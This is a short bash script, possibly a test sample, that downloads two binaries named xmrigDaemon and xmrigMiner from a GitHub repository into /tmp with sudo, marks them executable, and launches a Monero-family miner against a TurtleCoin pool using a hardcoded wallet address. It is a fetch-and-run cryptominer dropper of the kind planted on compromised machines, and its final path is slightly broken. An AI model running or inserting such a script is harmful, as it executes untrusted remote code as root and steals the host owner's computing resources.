#!/bin/bash

sudo wget https://github.com/jeffthorne/test/raw/main/xmrigDaemon -O /tmp/xmrigDaemon
sudo chmod +x /tmp/xmrigDaemon
sudo wget https://github.com/jeffthorne/test/raw/main/xmrigMiner -O /tmp/xmrigMiner
sudo chmod +x /tmp/xmrigMiner
sudo ./tmp/xmrigDaemon -o ca.turtlecoin.herominers.com:10380 -p x -k -u TRTLuzAyPPASGaxWJi4U7oJ9nEFVGkCcJVKoVyZuKyFJ88G1bjAtayJCBZ1cAdSJZgiDosGrFkcUbiLYFj7FUYdMMJaThJXhp92 --algo argon2/chukwav2

